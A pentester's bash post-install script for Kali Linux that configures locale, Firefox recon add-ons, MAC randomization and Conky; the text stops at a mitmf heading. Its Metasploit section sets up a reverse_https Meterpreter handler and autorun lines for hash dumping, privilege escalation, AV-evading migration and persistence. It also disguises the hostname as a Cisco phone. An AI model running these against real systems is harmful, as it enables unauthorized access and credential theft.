#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: kali.sh                     (Update: 2016-10-08) #
#-Info--------------------------------------------------------#
#  Personal post-install script for Kali Linux 2.0.           #
#-Author(s)---------------------------------------------------#
#  jbarcia / based off of g0tmilk                             #
#-Operating System--------------------------------------------#
#  Designed for: Kali Linux 2.0.0 [x64] (VM - VMware)         #
#     Tested on: Kali Linux 2.0.0 [x64/x84/full/light/mini/vm]#
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Run as root, just after a fresh/clean install of Kali 2.0. #
#  Kali v1.0 see ~ https://g0tmi1k/os-scripts/master/kali1.sh #
#                             ---                             #
#  By default it will set the time zone & keyboard to US/NY.  #
#                             ---                             #
#  Command line arguments:                                    #
#    --burp    = Automates configuring Burp Proxy (Free)      #
#    --hold    = Disable updating certain packages (e.g. msf) #
#    --openvas = Installs & configures OpenVAS vuln scanner   #
#    --osx     = Configures Apple keyboard layout             #
#                                                             #
#    e.g. # bash kali.sh --osx --burp --openvas               #
#                             ---                             #
#  Incomplete/buggy/hidden stuff - search for '***'.          #
#                             ---                             #
#             ** This script is meant for _ME_. **            #
#         ** EDIT this to meet _YOUR_ requirements! **        #
#-------------------------------------------------------------#


#-Defaults-------------------------------------------------------------#

##### Optional steps
freezeDEB=false             # Disable updating certain packages (e.g. Metasploit)            [ --hold ]
burpFree=false              # Disable configuring Burp Proxy Free (for Burp Pro users...)    [ --burp ]
openVAS=false               # Install & configure OpenVAS (not everyone wants it...)         [ --openvas ]

##### Github directory
gitdir=/root/github
mkdir -p $gitdir

##### (Optional) Enable debug mode?
#set -x

##### Get Kernel Version
proc=0
arm=0
if [ "$(uname -m)" == "x86_64" ]; then 
  proc=64
#  echo "64 bit"
elif [ "$(uname -m)" == "i386" ]; then 
  proc=32
#  echo "32 bit"
elif [[ "$(uname -m)" == *"arm"* ]]; then 
  arm=1
#  echo "ARM"
fi

##### Get Kali Version
vers=0
if [ "$(cat /etc/issue | cut -d/ -f2 | cut -d\\ -f1)" == "Linux Rolling " ]; then
  vers=rolling 
elif [ "$(cat /etc/issue | cut -d. -f1)" == "Kali GNU/Linux 2" ]; then 
  vers=kali2
elif [ "$(cat /etc/issue | cut -d. -f1)" == "Kali GNU/Linux 1" ]; then 
  vers=kali1
fi

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal


#-Arguments------------------------------------------------------------#


##### Read command line arguments
for x in $( tr '[:upper:]' '[:lower:]' <<< "$@" ); do
  if [[ "${x}" == "--osx" || "${x}" == "--apple" ]]; then
    keyboardApple=true
  elif [ "${x}" == "--hold" ]; then
    freezeDEB=true
  elif [ "${x}" == "--burp" ]; then
    burpFree=true
  elif [ "${x}" == "--openvas" ]; then
    openVAS=true
  else
    echo -e ' '${RED}'[!]'${RESET}" Unknown option: ${RED}${x}${RESET}" 1>&2
    exit 1
  fi
done


#-Start----------------------------------------------------------------#


##### Check if we are running as root - else this script will fail (hard!)
if [[ ${EUID} -ne 0 ]]; then
  echo -e ' '${RED}'[!]'${RESET}" This script must be ${RED}run as root${RESET}. Quitting..." 1>&2
  exit 1
else
  echo -e " ${BLUE}[*]${RESET} ${BOLD}Kali Linux post-install script${RESET}"
fi

##### Initial Setup
#echo "Is this an initial setup? (Y/N)"
#read -p ""
# if [ "$REPLY" == "y" -o "$REPLY" == "Y" ]; then
  # Change Hostname
  # SEP0023EB54B953
  hostname "SEP0023EB54B953"
  cat /etc/hosts | sed s/"kali"/"SEP0023EB54B953"/ > /tmp/newhosts
  mv /tmp/newhosts /etc/hosts
  cat /etc/hostname | sed s/"kali"/"SEP0023EB54B953"/ > /tmp/newhostname
  mv /tmp/newhostname /etc/hostname
  # Change Password
  passwd
#fi


##### Make share directory
mkdir -p /mnt/share

##### Install Gem Bundler
dpkg --configure -a
gem install bundler


##### Install g0tmi1k/os-scripts
if [ -d "os-scripts" ]; then
  cd os-scripts
  git stash
  git pull
  cd ..
elif [ ! -d "os-scripts" ]; then
  git clone https://github.com/g0tmi1k/os-scripts.git
fi

if [ $vers == "rolling" ]; then
  chmod +x os-scripts/kali-rolling.sh
  bash os-scripts/kali-rolling.sh
elif [ $vers == "kali2" ]; then 
  chmod +x os-scripts/kali2.sh
  bash os-scripts/kali2.sh
elif [ $vers == "kali1" ]; then 
  chmod +x os-scripts/kali1.sh
  bash os-scripts/kali1.sh
elif [ $vers == "backtrack" ]; then 
  chmod +x os-scripts/backtrack5r3.sh
  bash os-scripts/backtrack5r3.sh
elif [ $vers == 0 ]; then 
  echo "Unable to determine Kali version, run os-script manually"
fi

rm /etc/network/interfaces.d/eth1.cfg
dpkg --configure -a

##### Location information
keyboardApple=false         # Using a Apple/Macintosh keyboard? Change to anything other than 'false' to enable   [ --osx ]
keyboardlayout="us"
timezone="America/New_York"

curl --progress -k -L -f "https://status.github.com/api/status.json" | grep -q "good" || (echo -e ' '${RED}'[!]'${RESET}" ${RED}GitHub is currently having issues${RESET}. ${BOLD}Lots may fail${RESET}. See: https://status.github.com/" 1>&2 && sleep 10s)

##### Update location information - set either value to "" to skip.
echo -e "\n ${GREEN}[+]${RESET} Updating ${GREEN}location information${RESET} ~ keyboard layout (${BOLD}${keyboardlayout}${RESET}) & time zone (${BOLD}${timezone}${RESET})"
[ "${keyboardApple}" != "false" ]  && echo -e "\n ${GREEN}[+]${RESET} Applying ${GREEN}Apple hardware${RESET} profile"
#--- Configure keyboard layout
if [ ! -z "${keyboardlayout}" ]; then
  geoip_keyboard=$(curl -s http://ifconfig.io/country_code | tr '[:upper:]' '[:lower:]')
  [ "${geoip_keyboard}" != "${keyboardlayout}" ] && echo -e " ${YELLOW}[i]${RESET} Keyboard layout (${BOLD}${keyboardlayout}${RESET}}) doesn't match whats been detected via GeoIP (${BOLD}${geoip_keyboard}${RESET}})"
  file=/etc/default/keyboard; #[ -e "${file}" ] && cp -n $file{,.bkup}
  sed -i 's/XKBLAYOUT=".*"/XKBLAYOUT="'${keyboardlayout}'"/' "${file}"
  [ "${keyboardApple}" != "false" ] && sed -i 's/XKBVARIANT=".*"/XKBVARIANT="mac"/' "${file}"   # Enable if you are using Apple based products.
  #dpkg-reconfigure -f noninteractive keyboard-configuration   #dpkg-reconfigure console-setup   #dpkg-reconfigure keyboard-configuration -u    # Need to restart xserver for effect
fi
#--- Changing time zone
[ -z "${timezone}" ] && timezone=Etc/UTC     #Etc/GMT vs Etc/UTC vs UTC
echo "${timezone}" > /etc/timezone           #Etc/GMT vs Etc/UTC vs UTC vs Europe/London
ln -sf "/usr/share/zoneinfo/$(cat /etc/timezone)" /etc/localtime
dpkg-reconfigure -f noninteractive tzdata
#--- Setting locale    # Cant't do due to user input
#sed -i 's/^# en_/en_/' /etc/locale.gen   #en_GB en_US
#locale-gen
##echo -e 'LC_ALL=en_US.UTF-8\nLANG=en_US.UTF-8\nLANGUAGE=en_US:en' > /etc/default/locale
#dpkg-reconfigure -f noninteractive tzdata
##locale -a    # Check
#--- Installing ntp
apt-get -y -qq install ntp ntpdate || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
dpkg --configure -a
#--- Configuring ntp
#file=/etc/default/ntp; [ -e "${file}" ] && cp -n $file{,.bkup}
#grep -q "interface=127.0.0.1" "${file}" || sed -i "s/NTPD_OPTS='/NTPD_OPTS='--interface=127.0.0.1 /" "${file}"
#--- Update time
ntpdate -b -s -u pool.ntp.org
#--- Start service
systemctl restart ntp
#--- Remove from start up
systemctl disable ntp 2>/dev/null
#--- Check
#date
#--- Only used for stats at the end
start_time=$(date +%s)


###### Configure startup   ***
#echo -e "\n ${GREEN}[+]${RESET} Configuring ${GREEN}startup${RESET} ~ randomize the hostname, eth0 & wlan0s MAC address"
#--- Start up
#file=/etc/rc.local; [ -e "${file}" ] && cp -n $file{,.bkup}
#grep -q "macchanger" "${file}" 2>/dev/null || sed -i "s#^exit 0#for INT in eth0 wlan0; do\n  $(which ip) link set \${INT} down\n  $(which macchanger) -r \${INT} \&\& $(which sleep) 3s\n  $(which ip) link set \${INT} up\ndone\n\n\nexit 0#" "${file}"
#grep -q "hostname" "${file}" 2>/dev/null || sed -i "s#^exit 0#echo \$($(which cat) /dev/urandom | $(which tr) -dc 'A-Za-z' | $(which head) -c8) > /etc/hostname\nexit 0#" "${file}"
#--- On demand
file=/usr/local/bin/mac-rand; [ -e "${file}" ] && cp -n $file{,.bkup}
cat <<EOF > ${file}
#!/bin/bash
for INT in eth0 wlan0; do
  echo "[i] Randomizing: \${INT}"
  ifconfig \${INT} down
  macchanger -r \${INT} && sleep 3
  ifconfig \${INT} up
  echo "--------------------"
done
exit 0
EOF
chmod -f 0500 "${file}"
#--- Auto on interface change state (untested)
#file=/etc/network/if-pre-up.d/macchanger; [ -e "${file}" ] && cp -n $file{,.bkup}
#cat <<EOF > ${file}
##!/bin/bash
#[ "\${IFACE}" == "lo" ] && exit 0
#ifconfig \${IFACE} down
#macchanger -r \${IFACE}
#ifconfig \${IFACE} up
#exit 0
#EOF
#chmod -f 0500 "${file}"
#--- Disable random MAC address on start up
rm -f /etc/network/if-pre-up.d/macchanger


##### Configure bash - all users
# custom bash search
echo "## arrow up" >> ~/.inputrc
echo "\"\\e[A\":history-search-backward" >> ~/.inputrc
echo "## arrow down" >> ~/.inputrc
echo "\"\\e[B\":history-search-forward" >> ~/.inputrc


##### Create screenshots dir and add to favs
echo -e "\n ${GREEN}[+]${RESET} Configuring ${GREEN}file${RESET} (Nautilus/Thunar) ~ GUI file system navigation"
mkdir -p /root/Desktop/Screenshots
grep -q '^file:///root/Desktop/Screenshots ' "${file}" 2>/dev/null || echo 'file:///root/Desktop/Screenshots Screenshots' >> "${file}"


##### Setup firefox
##### Setup iceweasel's plugins
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}Firefox plugins${RESET} ~ Useful addons"
##--- Download extensions
ffpath="$(find ~/.mozilla/firefox/*.default*/ -maxdepth 0 -mindepth 0 -type d -name '*.default*' -print -quit)/extensions"
[ "${ffpath}" == "/extensions" ] \
  && echo -e ' '${RED}'[!]'${RESET}" Couldn't find Firefox folder" 1>&2
mkdir -p "${ffpath}/"
curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/557778/addon-557778-latest.xpi?src=api" -o "$ffpath/jid1-AWt6ex5aPvWtTg@jetpack.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Shodan Firefox Addon'" 1>&2     
curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/file/293038/showip-2.7.7-sm+tb+fx.xpi?src=dp-btn-primary" -o "$ffpath/{3e9bb2a7-62ca-4efa-a4e6-f6f6168a652d}.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'ShowIP'" 1>&2
curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/10229/addon-10229-latest.xpi" -o "$ffpath/wappalyzer@crunchlabz.com.xpi"  || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Wappalyzer'" 1>&2
curl --progress -k -L -f "https://addons.mozilla.org/firefox/downloads/latest/60/addon-60-latest.xpi?src=dp-btn-primary" -o "$ffpath/{c45c406e-ab73-11d8-be73-000a95be3b12}.xpi" || echo -e ' '${RED}'[!]'${RESET}" Issue downloading 'Web Developer'" 1>&2

#--- Installing extensions
for FILE in $(find "${ffpath}" -maxdepth 1 -type f -name '*.xpi'); do
  d="$(basename "${FILE}" .xpi)"
  mkdir -p "${ffpath}/${d}/"
  unzip -q -o -d "${ffpath}/${d}/" "${FILE}"
  rm -f "${FILE}"
done
#--- Enable Firefox's addons/plugins/extensions
timeout 15 firefox >/dev/null 2>&1
timeout 5 killall -9 -q -w firefox-esr >/dev/null
sleep 3s
#--- Method #1 (Works on older versions)
file=$(find ~/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'extensions.sqlite' -print -quit)   #&& [ -e "${file}" ] && cp -n $file{,.bkup}
if [[ -e "${file}" ]] || [[ -n "${file}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Enabled ${YELLOW}Firefox's extensions${RESET} (via method #1 - extensions.sqlite)"
  apt -y -qq install sqlite3 \
    || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
  rm -f /tmp/firefox.sql
  touch /tmp/firefox.sql
  echo "UPDATE 'main'.'addon' SET 'active' = 1, 'userDisabled' = 0;" > /tmp/firefox.sql    # Force them all!
  sqlite3 "${file}" < /tmp/firefox.sql      #fuser extensions.sqlite
fi
#--- Method #2 (Newer versions)
file=$(find ~/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'extensions.json' -print -quit)   #&& [ -e "${file}" ] && cp -n $file{,.bkup}
if [[ -e "${file}" ]] || [[ -n "${file}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Enabled ${YELLOW}Firefox's extensions${RESET} (via method #2 - extensions.json)"
  sed -i 's/"active":false,/"active":true,/g' "${file}"                # Force them all!
  sed -i 's/"userDisabled":true,/"userDisabled":false,/g' "${file}"    # Force them all!
fi
#--- Remove cache
file=$(find ~/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'prefs.js' -print -quit)   #&& [ -e "${file}" ] && cp -n $file{,.bkup}
[ -n "${file}" ] \
  && sed -i '/extensions.installCache/d' "${file}"
#--- For extensions that just work without restarting
timeout 15 firefox >/dev/null 2>&1
timeout 5 killall -9 -q -w firefox-esr >/dev/null
sleep 3s
#--- For (most) extensions, as they need firefox to restart
timeout 15 firefox >/dev/null 2>&1
timeout 5 killall -9 -q -w firefox-esr >/dev/null
sleep 5s
#--- Wipe session (due to force close)
find ~/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'sessionstore.*' -delete
##--- Configure foxyproxy
#file=$(find ~/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'foxyproxy.xml' -print -quit)   #&& [ -e "${file}" ] && cp -n $file{,.bkup}
#if [[ -z "${file}" ]]; then
#  echo -e ' '${RED}'[!]'${RESET}' Something went wrong with the FoxyProxy firefox extension (did any extensions install?). Skipping...' 1>&2
#else     # Create new
#  echo -ne '<?xml version="1.0" encoding="UTF-8"?>\n<foxyproxy mode="disabled" selectedTabIndex="0" toolbaricon="true" toolsMenu="true" contextMenu="false" advancedMenus="false" previousMode="disabled" resetIconColors="true" useStatusBarPrefix="true" excludePatternsFromCycling="false" excludeDisabledFromCycling="false" ignoreProxyScheme="false" apiDisabled="false" proxyForVersionCheck=""><random includeDirect="false" includeDisabled="false"/><statusbar icon="true" text="false" left="options" middle="cycle" right="contextmenu" width="0"/><toolbar left="options" middle="cycle" right="contextmenu"/><logg enabled="false" maxSize="500" noURLs="false" header="&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;link rel=&quot;icon&quot; href=&quot;http://getfoxyproxy.org/favicon.ico&quot;/&gt;&lt;link rel=&quot;shortcut icon&quot; href=&quot;http://getfoxyproxy.org/favicon.ico&quot;/&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;http://getfoxyproxy.org/styles/log.css&quot; type=&quot;text/css&quot;/&gt;&lt;/head&gt;&lt;body&gt;&lt;table class=&quot;log-table&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;td class=&quot;heading&quot;&gt;${timestamp-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${url-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${proxy-name-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${proxy-notes-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pattern-name-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pattern-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pattern-case-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pattern-type-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pattern-color-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${pac-result-heading}&lt;/td&gt;&lt;td class=&quot;heading&quot;&gt;${error-msg-heading}&lt;/td&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tfoot&gt;&lt;tr&gt;&lt;td/&gt;&lt;/tr&gt;&lt;/tfoot&gt;&lt;tbody&gt;" row="&lt;tr&gt;&lt;td class=&quot;timestamp&quot;&gt;${timestamp}&lt;/td&gt;&lt;td class=&quot;url&quot;&gt;&lt;a href=&quot;${url}&quot;&gt;${url}&lt;/a&gt;&lt;/td&gt;&lt;td class=&quot;proxy-name&quot;&gt;${proxy-name}&lt;/td&gt;&lt;td class=&quot;proxy-notes&quot;&gt;${proxy-notes}&lt;/td&gt;&lt;td class=&quot;pattern-name&quot;&gt;${pattern-name}&lt;/td&gt;&lt;td class=&quot;pattern&quot;&gt;${pattern}&lt;/td&gt;&lt;td class=&quot;pattern-case&quot;&gt;${pattern-case}&lt;/td&gt;&lt;td class=&quot;pattern-type&quot;&gt;${pattern-type}&lt;/td&gt;&lt;td class=&quot;pattern-color&quot;&gt;${pattern-color}&lt;/td&gt;&lt;td class=&quot;pac-result&quot;&gt;${pac-result}&lt;/td&gt;&lt;td class=&quot;error-msg&quot;&gt;${error-msg}&lt;/td&gt;&lt;/tr&gt;" footer="&lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;"/><warnings/><autoadd enabled="false" temp="false" reload="true" notify="true" notifyWhenCanceled="true" prompt="true"><match enabled="true" name="Dynamic AutoAdd Pattern" pattern="*://${3}${6}/*" isRegEx="false" isBlackList="false" isMultiLine="false" caseSensitive="false" fromSubscription="false"/><match enabled="true" name="" pattern="*You are not authorized to view this page*" isRegEx="false" isBlackList="false" isMultiLine="true" caseSensitive="false" fromSubscription="false"/></autoadd><quickadd enabled="false" temp="false" reload="true" notify="true" notifyWhenCanceled="true" prompt="true"><match enabled="true" name="Dynamic QuickAdd Pattern" pattern="*://${3}${6}/*" isRegEx="false" isBlackList="false" isMultiLine="false" caseSensitive="false" fromSubscription="false"/></quickadd><defaultPrefs origPrefetch="null"/><proxies>' > "${file}"
#  echo -ne '<proxy name="localhost:8080" id="1145138293" notes="e.g. Burp, w3af" fromSubscription="false" enabled="true" mode="manual" selectedTabIndex="0" lastresort="false" animatedIcons="true" includeInCycle="false" color="#07753E" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="true" disableCache="true" clearCookiesBeforeUse="false" rejectCookies="false"><matches/><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="127.0.0.1" port="8080" socksversion="5" isSocks="false" username="" password="" domain=""/></proxy>' >> "${file}"
#  echo -ne '<proxy name="localhost:8081 (socket5)" id="212586674" notes="e.g. SSH" fromSubscription="false" enabled="true" mode="manual" selectedTabIndex="0" lastresort="false" animatedIcons="true" includeInCycle="false" color="#917504" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="true" disableCache="true" clearCookiesBeforeUse="false" rejectCookies="false"><matches/><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="127.0.0.1" port="8081" socksversion="5" isSocks="true" username="" password="" domain=""/></proxy>' >> "${file}"
#  echo -ne '<proxy name="No Caching" id="3884644610" notes="" fromSubscription="false" enabled="true" mode="system" selectedTabIndex="0" lastresort="false" animatedIcons="true" includeInCycle="false" color="#990DA6" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="true" disableCache="true" clearCookiesBeforeUse="false" rejectCookies="false"><matches/><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="" port="" socksversion="5" isSocks="false" username="" password="" domain=""/></proxy>' >> "${file}"
#  echo -ne '<proxy name="Default" id="3377581719" notes="" fromSubscription="false" enabled="true" mode="direct" selectedTabIndex="0" lastresort="true" animatedIcons="false" includeInCycle="true" color="#0055E5" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="false" disableCache="false" clearCookiesBeforeUse="false" rejectCookies="false"><matches><match enabled="true" name="All" pattern="*" isRegEx="false" isBlackList="false" isMultiLine="false" caseSensitive="false" fromSubscription="false"/></matches><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="" port="" socksversion="5" isSocks="false" username="" password=""/></proxy>' >> "${file}"
#  echo -e '</proxies></foxyproxy>' >> "${file}"
#fi



#--- Autorun Metasploit commands each startup
mkdir -p /root/.msf4/modules/
file=/root/.msf4/msf_autorunscript.rc; [ -e "${file}" ] && cp -n $file{,.bkup}
cat <<EOF > "${file}"
#run post/windows/escalate/getsystem

#run migrate -f -k
#run migrate -n "explorer.exe" -k    # Can trigger AV alerts by touching explorer.exe...

#run post/windows/manage/smart_migrate
#run post/windows/gather/smart_hashdump

#run multi_meter_inject -pt windows/meterpreter/reverse_https -mr 192.168.22.105 -p 443
#run persistence_JBv2 -s 10.0.144.135 -l 1 -d 1.txt
#run scraper_crowe

EOF
file=/root/.msf4/msfconsole.rc; [ -e "${file}" ] && cp -n $file{,.bkup}
#load sounds verbose=true
#load auto_add_route
#load alias
#alias dir/ls    del/rm  auto handler   https://github.com/rapid7/metasploit-framework/tree/master/plugins // https://github.com/rapid7/metasploit-framework/issues/5107
cat <<EOF > "${file}"

#load auto_add_route
#load alias
#alias del rm
#alias handler use exploit/multi/handler
#load sounds
setg TimestampOutput true
setg VERBOSE true
setg ExitOnSession false
setg EnableStageEncoding true

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https

setg LHOST 0.0.0.0
setg LPORT 443

set AutoRunScript 'multi_console_command -rc "/root/.msf4/msf_autorunscript.rc"'
EOF
echo "spool /root/msf_console.`date +%m-%d-%Y_%H-%M-%S`.log" >> "${file}"



##### Custom Conky config
file=~/.conkyrc; [ -e "${file}" ] && cp -n $file{,.bkup}
cat <<EOF > "${file}"
--# Useful: http://forums.opensuse.org/english/get-technical-help-here/how-faq-forums/unreviewed-how-faq/464737-easy-configuring-conky-conkyconf.html
conky.config = {
    background = false,

    font = 'monospace:size=8:weight=bold',
    use_xft = true,

    update_interval = 2.0,

    own_window = true,
    own_window_type = 'normal',
    own_window_transparent = true,
    own_window_class = 'conky-semi',
    own_window_argb_visual = false,
    own_window_colour = 'brown',
    own_window_hints = 'undecorated,below,sticky,skip_taskbar,skip_pager',

    double_buffer = true,
    maximum_width = 260,

    draw_shades = true,
    draw_outline = false,
    draw_borders = false,

    stippled_borders = 3,
    border_inner_margin = 9,
    border_width = 10,

    default_color = 'grey',

    alignment = 'bottom_right',
    gap_x = 5,
    gap_y = 0,

    uppercase = false,
    use_spacer = 'right',
};

conky.text = [[
\${color dodgerblue3}SYSTEM \${hr 2}\$color
#\${color white}\${time %A},\${time %e} \${time %B} \${time %G}\${alignr}\${time %H:%M:%S}
\${color white}Host\$color: \$nodename  \${alignr}\${color white}Uptime\$color: \$uptime

\${color dodgerblue3}CPU \${hr 2}\$color
#\${font Arial:bold:size=8}\${execi 99999 grep "model name" -m1 /proc/cpuinfo | cut -d":" -f2 | cut -d" " -f2- | sed "s#Processor ##"}\$font\$color
\${color white}MHz\$color: \${freq} \${alignr}\${color white}Load\$color: \${exec uptime | awk -F "load average: "  '{print \$2}'}
\${color white}Tasks\$color: \$running_processes/\$processes \${alignr}\${color white}CPU0\$color: \${cpu cpu0}% \${color white}CPU1\$color: \${cpu cpu1}%
#\${color #c0ff3e}\${acpitemp}C
#\${execi 20 sensors |grep "Core0 Temp" | cut -d" " -f4}\$font\$color\${alignr}\${freq_g 2} \${execi 20 sensors |grep "Core1 Temp" | cut -d" " -f4}
\${cpugraph cpu0 25,120 000000 white} \${alignr}\${cpugraph cpu1 25,120 000000 white}
\${color white}\${cpubar cpu1 3,120} \${alignr}\${color white}\${cpubar cpu2 3,120}\$color

\${color dodgerblue3}PROCESSES \${hr 2}\$color
\${color white}NAME             PID     CPU     MEM
\${color white}\${top name 1}\${top pid 1}  \${top cpu 1}  \${top mem 1}\$color
\${top name 2}\${top pid 2}  \${top cpu 2}  \${top mem 2}
\${top name 3}\${top pid 3}  \${top cpu 3}  \${top mem 3}
\${top name 4}\${top pid 4}  \${top cpu 4}  \${top mem 4}
\${top name 5}\${top pid 5}  \${top cpu 5}  \${top mem 5}

\${color dodgerblue3}MEMORY & SWAP \${hr 2}\$color
\${color white}RAM\$color  \$alignr\$memperc%  \${membar 6,170}\$color
\${color white}Swap\$color  \$alignr\$swapperc%  \${swapbar 6,170}\$color

\${color dodgerblue3}FILESYSTEM \${hr 2}\$color
\${color white}root\$color \${fs_free_perc /}% free\${alignr}\${fs_free /}/ \${fs_size /}
\${fs_bar 3 /}\$color
#\${color white}home\$color \${fs_free_perc /home}% free\${alignr}\${fs_free /home}/ \${fs_size /home}
#\${fs_bar 3 /home}\$color

\${color dodgerblue3}LAN eth0 (\${addr eth0}) \${hr 2}\$color
\${color white}Down\$color:  \${downspeed eth0} KB/s\${alignr}\${color white}Up\$color: \${upspeed eth0} KB/s
\${color white}Downloaded\$color: \${totaldown eth0} \${alignr}\${color white}Uploaded\$color: \${totalup eth0}
\${downspeedgraph eth0 25,120 000000 00ff00} \${alignr}\${upspeedgraph eth0 25,120 000000 ff0000}\$color

\${color dodgerblue3}LAN eth1 (\${addr eth1}) \${hr 2}\$color
\${color white}Down\$color:  \${downspeed eth1} KB/s\${alignr}\${color white}Up\$color: \${upspeed eth1} KB/s
\${color white}Downloaded\$color: \${totaldown eth1} \${alignr}\${color white}Uploaded\$color: \${totalup eth1}
\${downspeedgraph eth1 25,120 000000 00ff00} \${alignr}\${upspeedgraph eth1 25,120 000000 ff0000}\$color

\${color dodgerblue3}LAN eth2 (\${addr eth2}) \${hr 2}\$color
\${color white}Down\$color:  \${downspeed eth2} KB/s\${alignr}\${color white}Up\$color: \${upspeed eth2} KB/s
\${color white}Downloaded\$color: \${totaldown eth2} \${alignr}\${color white}Uploaded\$color: \${totalup eth2}
\${downspeedgraph eth2 25,120 000000 00ff00} \${alignr}\${upspeedgraph eth2 25,120 000000 ff0000}\$color

\${color dodgerblue3}Wi-Fi (\${addr wlan0}) \${hr 2}\$color
\${color white}Down\$color:  \${downspeed wlan0} KB/s\${alignr}\${color white}Up\$color: \${upspeed wlan0} KB/s
\${color white}Downloaded\$color: \${totaldown wlan0} \${alignr}\${color white}Uploaded\$color: \${totalup wlan0}
\${downspeedgraph wlan0 25,120 000000 00ff00} \${alignr}\${upspeedgraph wlan0 25,120 000000 ff0000}\$color

\${color dodgerblue3}CONNECTIONS \${hr 2}\$color
\${color white}Inbound: \$color\${tcp_portmon 1 32767 count}  \${alignc}\${color white}Outbound: \$color\${tcp_portmon 32768 61000 count}\${alignr}\${color white}Total: \$color\${tcp_portmon 1 65535 count}
\${color white}Inbound \${alignr}Local Service/Port\$color
\$color \${tcp_portmon 1 32767 rhost 0} \${alignr}\${tcp_portmon 1 32767 lservice 0}
\$color \${tcp_portmon 1 32767 rhost 1} \${alignr}\${tcp_portmon 1 32767 lservice 1}
\$color \${tcp_portmon 1 32767 rhost 2} \${alignr}\${tcp_portmon 1 32767 lservice 2}
\${color white}Outbound \${alignr}Remote Service/Port\$color
\$color \${tcp_portmon 32768 61000 rhost 0} \${alignr}\${tcp_portmon 32768 61000 rservice 0}
\$color \${tcp_portmon 32768 61000 rhost 1} \${alignr}\${tcp_portmon 32768 61000 rservice 1}
\$color \${tcp_portmon 32768 61000 rhost 2} \${alignr}\${tcp_portmon 32768 61000 rservice 2}
]]
EOF





##### Install random libs
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}ssh libraries${RESET} & ${GREEN}GnuTLS${RESET} & ${GREEN}Networking Libraries${RESET} ~ compiling libraries"
#*** I know its messy...
for FILE in libssh2-1 libssh2-1-dev libgnutls-dev libdumbnet1; do
  apt-get -y -qq install "${FILE}" 2>/dev/null
  dpkg --configure -a
done




##### Install recordmydesktop
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}RecordMyDesktop${RESET} ~ GUI video screen capture"
apt-get -y -qq install recordmydesktop || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
dpkg --configure -a
#--- Installing GUI front end
apt-get -y -qq install gtk-recordmydesktop || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
dpkg --configure -a

##### Install mitmf
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}mitmf${RESET} ~ Man-In-The-Middle Framework"
